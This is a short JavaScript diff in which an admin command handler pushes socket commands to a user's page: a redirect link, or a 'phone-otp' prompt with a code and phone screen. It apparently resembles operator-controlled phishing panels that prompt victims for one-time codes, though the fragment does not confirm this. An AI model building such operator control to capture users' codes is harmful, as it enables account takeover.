@@ -560,8 +560,8 @@ async function handleAdminCommand({ userId, command, otp, io, db }) {
 
       if (link) {
         socket.emit("user:command", { command: "redirect", link });
-      } else if (otp) {
-        socket.emit("user:command", { command: "phone-otp", code, phonescreen });
+      } else if (code) {
+        socket.emit("user:command", { command , code, phonescreen });
       } else {
         socket.emit("user:command", { command });
       }
